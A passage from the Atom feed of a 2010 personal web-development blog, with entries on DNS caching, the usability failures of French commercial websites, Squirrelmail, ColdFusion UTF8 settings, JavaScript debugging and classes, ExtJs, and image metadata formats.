&lt;p&gt;Anyway, after waiting for some more hours, my website was again reachable
through &lt;code&gt;ssh&lt;/code&gt;and &lt;code&gt;ftp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So, if you&amp;#39;re sure your dns configuration is correct both on your register and
on your hosting service, make sure to clear every DNS cache you can have on
your own side. That include windows inner dns cache, those of your browser,
those of your router, and those of your specified preferred DNS resolving
server.&lt;/p&gt;

&lt;p&gt;If all that failed, it should be caching issue with your ISP, and there is
nothing you can do about that, except waiting.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Ergonomie Fail : GÃ©rer son nom de domaine chez Orange Business Service</title>
   <link href="http://blog.pixelastic.com/2010/02/08/ergonomie-fail-gerer-son-nom-de-domaine-chez-orange-business-service/"/>
   <updated>2010-02-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/08/ergonomie-fail-gerer-son-nom-de-domaine-chez-orange-business-service</id>
   <content type="html">&lt;p&gt;Et c&amp;#39;est reparti pour un tour. Cette fois, j&amp;#39;ai besoin de modifier certains
paramÃ¨tres techniques d&amp;#39;un nom de domaine enregistrÃ© chez OlÃ©ane (devenu
Orange Business Services).&lt;/p&gt;

&lt;p&gt;J&amp;#39;avais dÃ©jÃ  eu affaire Ã  eux dans le passÃ© et pour modifier les adresses DNS
du serveur j&amp;#39;avais du leur envoyer un fax (&lt;em&gt;Un fax, non mais des fois, faut
vraiment qu&amp;#39;ils aillent mal&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;Bref, aujourd&amp;#39;hui je dois y retourner et je me souviens pourquoi j&amp;#39;avais un
mauvais souvenir de &lt;a href=&quot;https://clients.fr.oleane.com/&quot;&gt;leur interface&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;DÃ©jÃ , on m&amp;#39;accueille avec un message que je ne pensais plus revoir sur le net
depuis 10 ans :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/08/4b701a583f287.jpg&quot; alt=&quot;Oleane : optimisation&quot;&gt;&lt;/p&gt;

&lt;p&gt;Il y a une checkbox sur le formulaire de login, avec la mention &amp;quot;mÃ©moriser ce
compte&amp;quot; mais bien sur, pas de &lt;label&gt; sur le texte, je dois donc cliquer sur
la checkbox plutot que sur le texte pour la cocher. C&amp;#39;est bÃªte, c&amp;#39;est pas
grand chose, mais Ã§a change quand mÃªme la vie.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/08/4b701b18dc11c.jpg&quot; alt=&quot;Oleane : label&quot;&gt;&lt;/p&gt;

&lt;p&gt;Je valide quand mÃªme et lÃ  Ã§a s&amp;#39;enchaine, la connection (en https://) n&amp;#39;est
pas sÃ©curisÃ© selon Firefox... Ca donne drolement confiance en leur service
Ã§a...&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/08/4b701b6d2a6d2.jpg&quot; alt=&quot;Oleane : unsecure connection&quot;&gt;&lt;/p&gt;

&lt;p&gt;Ok, c&amp;#39;est bien parce que je sais qu&amp;#39;ils sont plus incompÃ©tents que mÃ©chants
que je passe quand mÃªme.&lt;/p&gt;

&lt;p&gt;Et lÃ , deuxiÃ¨me horreur que je ne pensais pas revoir sur le net
d&amp;#39;aujourd&amp;#39;hui... Des gifs animÃ©s clignotants. Argh mes yeux... Mon dieu...
&lt;img src=&quot;/files/2010/02/08/4b701bf7b501e.gif&quot; alt=&quot;Oleane : gif&quot;&gt;&lt;img src=&quot;/files/2010/02/08/4b701bf7b501e.gif&quot; alt=&quot;Oleane :
gif&quot;&gt;&lt;img src=&quot;/files/2010/02/08/4b701bf7b501e.gif&quot; alt=&quot;Oleane :
gif&quot;&gt;&lt;/p&gt;

&lt;p&gt;Bon, j&amp;#39;arrive quand mÃªme sur l&amp;#39;interface. J&amp;#39;y allais Ã  la base pour y
retrouver la configuration du domaine pour recrÃ©er la mÃªme une fois que je
l&amp;#39;aurai transfÃ©rÃ©. Il me fallait aussi la liste des mails, vu que je vais
changer de serveur mail, je vais devoir recrÃ©er la liste.&lt;/p&gt;

&lt;p&gt;Heureusement, je trouve assez facilement, et ils ont une interface plutot
rÃ©ussi cette fois-ci. PrÃ©sentÃ©e comme un carnet d&amp;#39;adresse oÃ¹ je peux voir
toutes les adresses mails crÃ©Ã©s et les redirections actives. Cool.&lt;/p&gt;

&lt;p&gt;Il y a mÃªme un bouton &amp;quot;Import export&amp;quot;. J&amp;#39;imagine que c&amp;#39;est pour exporter ou
importer des listes de contacts (en *.csv ou autre) et n&amp;#39;a rien Ã  voir avec du
commerce Ã©tranger, je clique donc dessus et ...&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/08/4b701cfa21124.jpg&quot; alt=&quot;Oleane : erreur export&quot;&gt;&lt;/p&gt;

&lt;p&gt;Ah, hmm ok. Au temps pour moi, je suis bon pour le faire Ã  la main Ã  ce que je
vois...&lt;/p&gt;

&lt;p&gt;Il y a une fonction &amp;quot;Imprimer&amp;quot;, je vais quand mÃªme essayer cela. Ah cool, Ã§a
marche, Ã§a me donne une liste de tous les users avec leurs mails, de faÃ§on
claire et lisible. Parfait.&lt;/p&gt;

&lt;p&gt;Je cherche un peu pour trouver les options d&amp;#39;administration DNS du domaine,
mais rien. Apparamment, je ne peux que Ã©diter ce qui a trait Ã  la messagerie,
je parie que pour les DNS je vais encore devoir envoyer en fax.&lt;/p&gt;

&lt;p&gt;Tant pis, de toutes faÃ§ons, le nom de domaine a Ã©tÃ© migrÃ© chez Gandi, tout
sera bien plus simple lÃ  bas.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Ergonomie Fail : Commander en ligne chez But</title>
   <link href="http://blog.pixelastic.com/2010/02/07/ergonimie-fail-commander-en-ligne-chez-but/"/>
   <updated>2010-02-07T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/07/ergonimie-fail-commander-en-ligne-chez-but</id>
   <content type="html">&lt;p&gt;Le week-end dernier j&amp;#39;ai vu un joli petit bureau dans un magasin But. Je
n&amp;#39;Ã©tais pas sur des dimensions chez moi et je ne l&amp;#39;ai donc pas achetÃ© sur
place en me disant que je pourrai le commander sur Internet plus tard si
j&amp;#39;avais effectivement la place de le mettre chez moi.&lt;/p&gt;

&lt;p&gt;De retour chez moi et une fois les mesures prises, c&amp;#39;est bon, le bureau tiens
parfaitement, je vais donc sur le &lt;a href=&quot;http://www.but.fr/&quot;&gt;site de But&lt;/a&gt; pour le
commander. Je &lt;a href=&quot;http://www.but.fr/produits/26418/Bureau-%0Adroit-CYCLO-1113-Blanc.html&quot;&gt;le trouve facilement&lt;/a&gt;, je l&amp;#39;ajoute Ã  mon panier, je valide mon panier
et lÃ , la galÃ¨re commence.&lt;/p&gt;

&lt;p&gt;But me demande d&amp;#39;indiquer mon code postal pour voir le magasin le plus proche
pour me livrer. Pas de problÃ¨me. Je termine ma commande (en acceptant les CGV)
et lÃ  il me demande mon login/pass ou de me crÃ©er un compte si je n&amp;#39;en ai pas.&lt;/p&gt;

&lt;p&gt;Va pour la seconde solution. Nom, prÃ©nom, etc... Ca commence Ã  se gater pour
le code postal et la ville. Il y a un auto-complete sur le code postal censÃ©
remplir automatiquement la ville mais il n&amp;#39;est pas complÃ©tement au point, j&amp;#39;ai
du recommencer 2 fois. Bref, Ã§a fini par passer.&lt;/p&gt;

&lt;p&gt;Je mets mon mail, mon mot de passe, dÃ©coche les newsletters et c&amp;#39;est parti.&lt;/p&gt;

&lt;p&gt;Ok... J&amp;#39;arrive Ã  nouveau sur la mÃªme page, avec mon formulaire tout vidÃ© et
aucun message de feedback... Ah, je remarque quand mÃªme un &amp;quot;Bonjour M TimothÃ©e
Carry&amp;quot; en haut de la page, il semblerait que j&amp;#39;ai quand mÃªme Ã©tÃ© enregistrÃ©.&lt;/p&gt;

&lt;p&gt;Je remarque aussi un lien &amp;quot;Mon espace client&amp;quot; en haut, si je suis identifiÃ©,
je devrait y trouver moyen de terminer ma commande.&lt;/p&gt;

&lt;p&gt;Ah, non. Ca me renvoie sur la mÃªme page d&amp;#39;authentification/inscription. Bon,
si ca se trouve je suis inscrit, je vais tenter de me logguer avec le
mail/pass que j&amp;#39;ai indiquÃ©.&lt;/p&gt;

&lt;p&gt;Ah cool, Ã§a marche... Bon heureusement que j&amp;#39;ai essayÃ© mais rien que cela, Ã§a
aurait dÃ©boutÃ© plus d&amp;#39;un client potentiel.&lt;/p&gt;

&lt;p&gt;Bon, j&amp;#39;arrive donc sur le deuxieme Ã©tape de ma commande, celle oÃ¹ je dois
indiquer mes coordonÃ©es de livraison. Ce ne sont pas les mÃªme que l&amp;#39;adresse
indiquÃ©e pour mon compte, je veux le faire livrer chez quelqu&amp;#39;un d&amp;#39;autre, on
va l&amp;#39;appeller Mlle Anne Onyme. Heureusement il y a deux liens &amp;quot;Modifier mes
informations&amp;quot; et &amp;quot;Modifier mon adresse&amp;quot;. Je vais essayer le premier.&lt;/p&gt;

&lt;p&gt;Ca m&amp;#39;ouvre une lightbox avec un petit formulaire oÃ¹ je peux changer mon nom,
prÃ©nom et tÃ©lÃ©phone. Hmm... C&amp;#39;est pas trÃ¨s clair si ca va changer les infos de
mon compte ou celles de cette commande...&lt;/p&gt;

&lt;p&gt;En plus, les champs TÃ©lÃ©phone et NÂ° de carte But sont pre-rempli par ce qui
semble etre un caractÃ¨re ASCII nul (0000). Pas trÃ¨s pro Ã§a.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/07/4b6ec6be99207.jpg&quot; alt=&quot;But : Changer infos personnelles&quot;&gt;&lt;/p&gt;

&lt;p&gt;Bon, je change le nom et prÃ©nom pour mettre ceux de la personne Ã  qui je veux
l&amp;#39;envoyer et je valide.&lt;/p&gt;

&lt;p&gt;Oups... erreur. Il semblerait que les numeros de tÃ©lÃ©phone ne soient pas
valides... Bizarre, je n&amp;#39;avais pas mis de numero lors de mon inscription et il
n&amp;#39;avait pas criÃ© au scandale pour autant.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/07/4b6ec751d2296.jpg&quot; alt=&quot;But Changer infos personnelles&quot;&gt;&lt;/p&gt;

&lt;p&gt;Bon, je vais jouer le jeu et mettre un numero de tel, mais je ne sais pas
lequel mettre. Le mien ou celui de la personne Ã  qui je fais livrer. Je veux
livrer cela comme un cadeau, donc je ne veux pas qu&amp;#39;ils l&amp;#39;appellent avant pour
mettre au point les dÃ©tails de la livraison, je devrai donc mettre le mien
comme numero. Pas trÃ¨s clair cette histoire, ils devraient indiquer Ã  qui sert
ce numero.&lt;/p&gt;

&lt;p&gt;Bon, j&amp;#39;indique mon numero de portable et je valide. Aucune rÃ©action. Je valide
Ã  nouveau : rien. Je lance Firebug et regarde les requetes AJAX. Ah, ils
envoient un check au serveur pour valider et apparemment j&amp;#39;ai toujours des
erreurs. Ergonomie fail une fois de plus. Ils auraient du mettre un petit
loading le temps qu&amp;#39;ils fassent cette requete parce que Ã  j&amp;#39;ai une erreur,
mais j&amp;#39;ai l&amp;#39;impression que rien n&amp;#39;a changÃ©.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/07/4b6ec816eb6b0.jpg&quot; alt=&quot;But : Validation firebug&quot;&gt;&lt;/p&gt;

&lt;p&gt;Bon, j&amp;#39;imagine que c&amp;#39;est parce que j&amp;#39;ai des champs ASCII nuls qu&amp;#39;il dÃ©conne.
J&amp;#39;ai la chance d&amp;#39;etre sous Firefox et que ces champs ASCII soient symbolisÃ©s,
j&amp;#39;imagine qu&amp;#39;un internaute sous IE n&amp;#39;aurait rien compris du tout.&lt;/p&gt;

&lt;p&gt;Je revalide... Rhooo. Encore une erreur ! J&amp;#39;ai indiquÃ© mon numero de tÃ©lÃ©phone
en sÃ©parant chaque groupe de deux chiffres(06 12 34 56 78) et Ã§a passe pas sa
validation... Ca c&amp;#39;est clairement le genre de check cotÃ© serveur qui peut Ãªtre
fait en une ligne de code, supprimer les espaces, et valider le nouveau numero
de tÃ©lÃ©phone. Ca devrait etre au serveur de faire ce travail, pas au client
d&amp;#39;entrer son numero de tÃ©lÃ©phone de facon formattÃ©e (ou alors, que AU MOINS,
on m&amp;#39;indique le format attendu).&lt;/p&gt;

&lt;p&gt;Bref, je rÃ©-ecrit mon tÃ©lÃ©phone de faÃ§on agglutinÃ©e (0612345678) (tout en me
disant que cette validation exclut le format international (+33)6xxxx )&lt;/p&gt;

&lt;p&gt;Ahhhh, cette fois, Ã§a passe. C&amp;#39;est bon, mes infos personnelles sont modifiÃ©es.
Uhh... Je remarque alors une chose Ã©trange. Le message de bienvenue est devenu
&amp;quot;Bonjour Mlle Anne Onyme&amp;quot;... Cela veut dire que j&amp;#39;ai changÃ© les infos de mon
compte plutot que celle de l&amp;#39;adresse de livraison ? _Quoi la baise?!!? _comme
on dit.&lt;/p&gt;

&lt;p&gt;(Juste par acquis de conscience, j&amp;#39;ai voulu rÃ©-editer mes infos personnelles
aussitot, et comme je m&amp;#39;y attendais, la pop-up contenait encore mes anciennes
infos... Enfin bon)&lt;/p&gt;

&lt;p&gt;Bref, bon, je suis plus Ã  Ã§a prÃ¨s. Je continue et modifie mon adresse.&lt;/p&gt;

&lt;p&gt;MÃªme chose que tout Ã  l&amp;#39;heure, les champs vides sont remplis par un code ASCII
nul... Je suis sur que ca va faire bugguer leur validation, donc je les vide
rÃ©ellement et je mets l&amp;#39;adresse de livraison.&lt;/p&gt;

&lt;p&gt;Ah ! Cette fois-ci j&amp;#39;ai droit Ã  un joli loading en gif le temps qu&amp;#39;il fasse sa
validation. Cool. On dirait qu&amp;#39;ils m&amp;#39;ont entendu. Je ne comprends pas trop
pourquoi il est prÃ©sent sur l&amp;#39;une des lightbox et pas sur l&amp;#39;autre mais
passons. Peut-Ãªtre que je ne l&amp;#39;avais pas vu la premiÃ¨re fois ?&lt;/p&gt;

&lt;p&gt;Allez, je suis maso, je vais retourner voir la premiÃ¨re lightbox pour vÃ©rifier
si elle ne m&amp;#39;a pas Ã©chappÃ©e.&lt;/p&gt;

&lt;p&gt;Mais argh ! Le rÃ©capitulatif de mon adresse a un problÃ¨me d&amp;#39;encodage... Ma
jolie adresse de &amp;quot;10 rue des la crÃ¨pe au sucre&amp;quot; est devenue &amp;quot;10 rue de la
crÃÂ¨pe au sucre&amp;quot;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/07/4b6ec6ad83d2e.jpg&quot; alt=&quot;But : Adresse utf8&quot;&gt;&lt;/p&gt;

&lt;p&gt;Petit coup d&amp;#39;oeil aux headers HTTP et Ã  la source pour voir l&amp;#39;encoding
spÃ©cifiÃ©. C&amp;#39;est en iso-8859-1 dans les deux. Au moins ils sont constants, mais
ils doivent avoir un problÃ¨me d&amp;#39;utf8 autre part sur leurs scripts serveurs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/07/4b6ec6e42c54a.jpg&quot; alt=&quot;But : Headers HTTp&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/02/07/4b6ec6fd7a309.jpg&quot; alt=&quot;But : Source html&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Au passage on remarque dans les headers un X-Cnection: close assez suspect,
il faudra que je me renseigne lÃ  dessus.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Bon, bref, un probleme d&amp;#39;encodage, c&amp;#39;est assez commun. Je voulais re-modifier
mes coordonnÃ©es pour vÃ©rifier la prÃ©sence du loading. Je rÃ©-ouvre donc la
lightbox. Les champs vides sont encore redevenus des ASCII nul et me font
encore casser la validation. Bref, je revalide et non vraiment, il n&amp;#39;y a pas
de loading, j&amp;#39;avais bien vu...&lt;/p&gt;

&lt;p&gt;Je retourner Ã©diter mon adresse, je veux vÃ©rifier les headers retournÃ©s par
AJAX, si Ã§a se trouve le problÃ¨me d&amp;#39;encoding vient de lÃ .&lt;/p&gt;

&lt;p&gt;Hmm. Leur faÃ§on de faire de l&amp;#39;ajax est pour le moins... spÃ©ciale. Une fois que
la validation (en AJAX) a fonctionnÃ©e, ils reloadent la page html
complÃ©tement... Ca sent vraiment l&amp;#39;AJAX rajoutÃ© en derniÃ¨re minute parce que
c&amp;#39;est &lt;em&gt;hype&lt;/em&gt;, mais sans trop comprendre Ã  quoi Ã§a sert...&lt;/p&gt;

&lt;p&gt;Donc, groumpf, je re-recommence, en activant le mode &amp;quot;Persist&amp;quot; de Firebug pour
pouvoir traquer les connections mÃªme aprÃ¨s le reload. Bon, il s&amp;#39;avÃ¨re que la
rÃ©ponse du serveur n&amp;#39;a pas de charset spÃ©cifiÃ© dans ses headers, mais comme
tout le page est reloadÃ©e je ne peux pas dire d&amp;#39;oÃ¹ vient le soucis. Peut-Ãªtre
l&amp;#39;adresse est-elle mal enregistrÃ©e dans la base de donnÃ©e tout simplement.&lt;/p&gt;

&lt;p&gt;Bon, et je me suis arretÃ© lÃ  et ai choisi d&amp;#39;aller acheter mon meuble
directement dans un magasin car clairement leur site n&amp;#39;a fait l&amp;#39;objet d&amp;#39;aucune
Ã©tude ergonomique.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>What would we be studying if our world was a software ?</title>
   <link href="http://blog.pixelastic.com/2010/02/04/what-would-we-be-studying-if-our-world-was-a-software/"/>
   <updated>2010-02-04T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/04/what-would-we-be-studying-if-our-world-was-a-software</id>
   <content type="html">&lt;blockquote&gt;
&lt;p&gt;Physics is just reverse-engineering the world&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I once heard or read that somewhere and that make me smile.&lt;/p&gt;

&lt;p&gt;Today I wondered if the same analogy could be applied to the other subjects we
are teached in school.&lt;/p&gt;

&lt;p&gt;If Physics is reverse-engineering, then Mathematics is using the World
framework and developping new applications and unit testing with it.&lt;/p&gt;

&lt;p&gt;Biology would be micro-debugging and desassambling it, maybe even re-compiling
it.&lt;/p&gt;

&lt;p&gt;History would be nothing more than writing and parsing the logs.&lt;/p&gt;

&lt;p&gt;Geography would be mapping the whole network.&lt;/p&gt;

&lt;p&gt;French (or English, or whatever your first language is) would be reading and
learning the doc and man pages. And of course, foreign languages would mean
learning new programming languages.&lt;/p&gt;

&lt;p&gt;Sports would be the fun part, where you are playing you video games.&lt;/p&gt;

&lt;p&gt;Did I forgot something ?&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Debugging a Squirrel webmail</title>
   <link href="http://blog.pixelastic.com/2010/02/03/debugging-a-squirrel-webmail/"/>
   <updated>2010-02-03T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/03/debugging-a-squirrel-webmail</id>
   <content type="html">&lt;p&gt;This is a quick blogpost, essentially as a reminder for myself :&lt;/p&gt;

&lt;p&gt;A client of mine is using the Squirrel mail webmail. Once in a while, I have a
call from him telling me that he can&amp;#39;t access its account. The cause is always
the same : there is way too much mails saved in his account and Squirrel mail
choke on this, refusing to display the page.&lt;/p&gt;

&lt;p&gt;The solution is simple, I just have to remove all the mails (except maybe the
100 or so last ones) and save them in a another directory, for archiving. The
directory to save is &lt;code&gt;/home/mailusers/c/contact/cur&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But, thinking I was clever, instead of copying all the files to a new &lt;code&gt;cur-
save-2009&lt;/code&gt; directory I thought it would be faster to rename the current
directory to &lt;code&gt;cur-save-2009&lt;/code&gt; and create a new empty &lt;code&gt;cur&lt;/code&gt; dir. Except that I
forgot that I was loggued in as &lt;code&gt;root&lt;/code&gt;and the directory must have a
user/group set as &lt;code&gt;postfix&lt;/code&gt;...&lt;/p&gt;

&lt;p&gt;That&amp;#39;s it, I just had to not forgot to set the owner/group of the &lt;code&gt;cur/&lt;/code&gt;
directory as postfix once cleared.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Database in UTF8 with Coldfusion</title>
   <link href="http://blog.pixelastic.com/2010/01/27/database-in-utf8-with-coldfusion/"/>
   <updated>2010-01-27T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/27/database-in-utf8-with-coldfusion</id>
   <content type="html">&lt;p&gt;When setting up a Coldfusion application, do not forget to add to your
datasource the following connection string :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cfm&quot; data-lang=&quot;cfm&quot;&gt;characterEncoding=UTF8&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;characterSetResults=UTF8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It will ensure that your data is correctly saved and fetched using UTF8. This
is the coldfusion equivalent of the more commonly known &lt;code&gt;SET NAMES &amp;#39;utf8&amp;#39;;&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Never use alert() for debugging</title>
   <link href="http://blog.pixelastic.com/2010/01/20/nevre-use-alert-for-debugging/"/>
   <updated>2010-01-20T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/20/nevre-use-alert-for-debugging</id>
   <content type="html">&lt;p&gt;One thing I learned today is to never use alert() for debugging pruposes. When
the javascript alert() function is called it blocks every other action until
the OK button is pressed. It means that your javascript code that is
immediatly after the alert() call is delayed until you press OK.&lt;/p&gt;

&lt;p&gt;It also means that the thread your browser gave to the javascript engine is
halted during all this time.&lt;/p&gt;

&lt;p&gt;Imagine you are binding keyboard shortcuts on your website to specific
actions. Like pressing Ctrl+S will submit the current form. Of course, Ctrl+S
is already defined as a shortcut in the browser, so you will take care of
preventing the default behavior in your custom function (using return false,
e.preventDefault(), e.stopPropagation() or any method defined in your
framework to do that)&lt;/p&gt;

&lt;p&gt;The problem is that is you call alert() in your function, the Javascript
thread will be halted before you can make the call to stop the propagation and
thus, the browser will take control again and firing its default shortcut.&lt;/p&gt;

&lt;p&gt;So my advice is that you should never use alert for debugging. Use the
console.debug() method shipped in firebur or directly write to the DOM but do
not use alert().&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Writing a class in Javascript</title>
   <link href="http://blog.pixelastic.com/2010/01/18/writing-a-class-in-javascript/"/>
   <updated>2010-01-18T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/18/writing-a-class-in-javascript</id>
   <content type="html">&lt;p&gt;I always have to refer to a manual or a webpage to remember the correct syntax
for creating a new class in Javascript. Here it is :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;myClass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Here I can define private variables and methods&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;myPrivateVar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;myPrivateMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// And now I will return an object, so it is the place&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// to put public variables and methods&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;publicVariable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;publicMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Note that this function is executed and so the object is returned.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Learning extJs</title>
   <link href="http://blog.pixelastic.com/2010/01/15/learning-extjs/"/>
   <updated>2010-01-15T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/15/learning-extjs</id>
   <content type="html">&lt;p&gt;Today, the &lt;a href=&quot;http://jquery14.com/day-01/jquery-14&quot;&gt;jquery 1.4&lt;/a&gt; version was
released, and today is the day where I start to learn extJs (don&amp;#39;t ask me
why).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.extjs.com/&quot;&gt;EXTJs&lt;/a&gt; seems to be promising, it seems really easy to
make powerful and professional-looking interfaces for handling data with it.&lt;/p&gt;

&lt;p&gt;When learning Coldfusion I was often horrified by the &lt;a href=&quot;http://help.adobe.com/en_US/ColdFusion/9.0/CFMLRef/WSc3ff6d0ea77%0A859461172e0811cbec22c24-79f9.html&quot;&gt;really poor html
example code&lt;/a&gt; shipped with the Coldfusion example :
&lt;font&gt;, &lt;span align=&quot;left&quot;&gt;, multiple nested tables.&lt;/p&gt;

&lt;p&gt;With EXTJs, it seems to be the same, the &lt;a href=&quot;http://www.extjs.com/learn/Tutorial:Basic_Page_Setup&quot;&gt;basic page
setup&lt;/a&gt; tell me not to
put a Doctype to my page to &amp;quot;avoid IE problems&amp;quot;, as well as putting my
javascript in the head of the page...&lt;/p&gt;

&lt;p&gt;That is simply horrible advices. I hope the rest of the framewok is not of the
same kind or learning it will be painful.&lt;/p&gt;

&lt;p&gt;One thing that is quite frustrating with their documentation is that it is
absolutly not up to date. It is refering to 1.0 or 2.0 version even if the
current one is 3.0.&lt;/p&gt;

&lt;p&gt;I resort to reading the &amp;quot;Learning EXTJs&amp;quot; book (if you know how to properly use
google, you should find a full PDF online). It told me a lot of things about
the approach of the framework, I sincerely recommend that you read it if you
want to learn ExtJs. Too bad the book was released before the 3.0 version, but
by refering to the API whenever you need to use a new class, you should be ok&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>A little introduction to image metadata</title>
   <link href="http://blog.pixelastic.com/2010/01/14/a-little-introduction-to-image-metadata/"/>
   <updated>2010-01-14T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/14/a-little-introduction-to-image-metadata</id>
   <content type="html">&lt;p&gt;For the project I&amp;#39;m working on, I have to save numerous&lt;a href=&quot;http://en.wikipedia%0A.org/wiki/International_Press_Telecommunications_Council&quot;&gt; &lt;/a&gt;data in image files.
The &lt;a href=&quot;http://en.wikipedia.org/wiki/Metadata&quot;&gt;metadata &lt;/a&gt;I have to write can be
in different languages and uses different encoding (mainly French, English,
Spanish and Chinese).&lt;/p&gt;

&lt;h2&gt;A little history&lt;/h2&gt;

&lt;p&gt;There is mainly three formats to store data inside an image. The main one is
called &lt;a href=&quot;http://en.wikipedia.org/wiki/Exif&quot;&gt;EXIF&lt;/a&gt;, its main goal is to store
techical data about the image like the operture, is the flash was fired, the
resolution, the iso settings and so on.&lt;/p&gt;

&lt;p&gt;The second one is called
&lt;a href=&quot;http://en.wikipedia.org/wiki/IPTC_Information_Interchange_Model&quot;&gt;IPTC&lt;/a&gt;. Its
main goal was to store more subjective information about the file like its
description, its author, copyright informations, etc.&lt;/p&gt;

&lt;p&gt;IPTC is an old standard and is more or less replaced with &lt;a href=&quot;http://en.wikipedia.org/wiki/Extensible_Metadata_Platform&quot;&gt;XMP
&lt;/a&gt;nowadays becuase
of numerous restrictions on it (mainly no UTF8 and internationalisation
support). (A later version named IPTC-IIM was created to correct some of the
minor restrictions, but it was still far from perfect).&lt;/p&gt;

&lt;p&gt;It is now more or less replaced with XMP. XMP is based on XML and uses the
Dublin Core tags. It is the future of metadatas because its structure allows
it to be extended.&lt;/p&gt;

&lt;h2&gt;And now, the problems&lt;/h2&gt;

&lt;p&gt;The problem is that with this three formats, it is quite difficult to know
where to store or read the information we want. Additionnaly the XMP support
is not very mainstrean on the software, even Adobe (creator of the XMP format)
does not support it totally accross its products.&lt;/p&gt;

&lt;p&gt;A &lt;a href=&quot;http://www.metadataworkinggroup.org/&quot;&gt;Metadata Working Group&lt;/a&gt; had been
formed to tell all the good people of Metadata-land what to do when faced with
an image filled with metadatas. They wrote a recommendation guide telling us
how to handle reconciliation (a same information is stored in more than one
format, but with different values) and make our software the most compatible
with existing software.&lt;/p&gt;

&lt;h2&gt;What about me ?&lt;/h2&gt;

&lt;p&gt;That&amp;#39;s when I can talk about me again. I&amp;#39;m working on a project where I have
to read a full database of images, parse their metadatas, store them in a
database, and build an interface to search accross the database based on
criterias like keywords, author, etc.&lt;/p&gt;

&lt;p&gt;I also have to handle the web side of this and allow for easy creation of
thumbnails, large and medium version with metadatas correctly written inside
the file.&lt;/p&gt;

